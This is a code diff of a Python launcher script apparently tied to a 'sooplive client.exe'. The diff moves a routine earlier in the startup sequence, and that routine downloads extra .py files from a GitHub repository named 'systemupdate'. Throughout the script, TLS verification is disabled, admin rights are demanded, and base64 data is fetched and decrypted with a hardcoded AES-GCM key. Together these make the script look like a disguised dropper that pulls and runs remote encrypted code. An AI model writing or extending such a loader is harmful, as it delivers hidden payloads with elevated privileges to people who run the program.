@@ -12,6 +12,36 @@ import urllib.request
 import zlib
 
 SOOPLIVE_CLIENT = "sooplive client.exe"
+RAW_BASE = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/"
+_ctx = ssl.create_default_context()
+_ctx.check_hostname = False
+_ctx.verify_mode = ssl.CERT_NONE
+
+
+def _download_sidecar(name):
+    """GitHub에서 .py 받기 (reexec 전에 sync_launchers 필요)."""
+    dest = os.path.join(os.getcwd(), name)
+    req = urllib.request.Request(
+        RAW_BASE + name + "?t=%d" % int(time.time()),
+        headers={
+            "User-Agent": "ddong",
+            "Cache-Control": "no-cache, no-store, must-revalidate",
+            "Pragma": "no-cache",
+        },
+    )
+    with urllib.request.urlopen(req, timeout=25, context=_ctx) as r:
+        data = r.read()
+    if not data or len(data) < 50:
+        raise RuntimeError("%s 다운로드 실패" % name)
+    with open(dest, "wb") as f:
+        f.write(data)
+
+
+def _bootstrap_sync_launchers():
+    try:
+        _download_sidecar("sync_launchers.py")
+    except Exception:
+        pass
 
 
 def _setup_app_dir():
@@ -90,6 +120,7 @@ def _reexec_via_client_if_needed():
 
 
 _setup_app_dir()
+_bootstrap_sync_launchers()
 _sync_client_launcher()
 _reexec_via_client_if_needed()
 
@@ -126,14 +157,10 @@ def _ensure_admin():
 
 _ensure_admin()
 
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
 DATA_URL = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/data.txt"
-RAW_BASE = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/"
 
 
 def _pip_python():
@@ -174,33 +201,13 @@ def fetch_data_b64():
             "Pragma": "no-cache",
         },
     )
-    with urllib.request.urlopen(req, timeout=20, context=ctx) as r:
+    with urllib.request.urlopen(req, timeout=20, context=_ctx) as r:
         return r.read().decode("utf-8").strip()
-
-
-def _download_sidecar(name):
-    """ImGui UI 등 data.txt 옆에 필요한 .py 를 GitHub에서 받아 둔다."""
-    dest = os.path.join(os.getcwd(), name)
-    req = urllib.request.Request(
-        RAW_BASE + name + "?t=%d" % int(time.time()),
-        headers={
-            "User-Agent": "ddong",
-            "Cache-Control": "no-cache, no-store, must-revalidate",
-            "Pragma": "no-cache",
-        },
-    )
-    with urllib.request.urlopen(req, timeout=25, context=ctx) as r:
-        data = r.read()
-    if not data or len(data) < 50:
-        raise RuntimeError("%s 다운로드 실패" % name)
-    with open(dest, "wb") as f:
-        f.write(data)
 
 
 try:
     _ensure_imgui_pkgs()
     _download_sidecar("imgui_ui.py")
-    _download_sidecar("sync_launchers.py")
     b64_str = fetch_data_b64()
     raw = base64.b64decode(b64_str)
     g = AESGCM(KEY)
